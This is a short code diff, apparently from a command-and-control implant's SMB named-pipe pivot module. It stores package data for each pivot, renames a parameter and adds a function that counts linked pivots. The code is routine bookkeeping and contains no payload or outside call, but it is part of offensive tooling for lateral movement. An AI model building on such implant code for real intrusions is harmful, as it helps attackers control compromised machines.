@@ -65,11 +65,13 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
     {
         PRINTF( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )
 
-        Data           = Instance->Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
-        Data->PipeName = NamedPipe;
-        Data->Handle   = Handle;
-        Data->Next     = NULL;
-        Data->DemonID  = PivotParseDemonID( *Output, *BytesSize );
+        Data              = Instance->Win32.LocalAlloc( LPTR, sizeof( PIVOT_DATA ) );
+        Data->PipeName    = NamedPipe;
+        Data->Handle      = Handle;
+        Data->Next        = NULL;
+        Data->DemonID     = PivotParseDemonID( *Output, *BytesSize );
+        Data->Package     = *Output;
+        Data->PackageSize = *BytesSize;
 
         if ( ! Instance->SmbPivots )
         {
@@ -101,11 +103,28 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
 }
 
 // TODO: remove from linked list and close connection
-BOOL PivotRemove( DWORD DemonId )
+BOOL PivotRemove( DWORD AgentId )
 {
     BOOL Success = FALSE;
 
     return Success;
+}
+
+DWORD PivotCount()
+{
+    PPIVOT_DATA TempList = Instance->SmbPivots;
+    DWORD       Counter  = 0;
+
+    do {
+        if ( TempList )
+        {
+            Counter++;
+            TempList = TempList->Next;
+        } else
+            break;
+    } while ( TRUE );
+
+    return Counter;
 }
 
 VOID PivotCollectOutput()
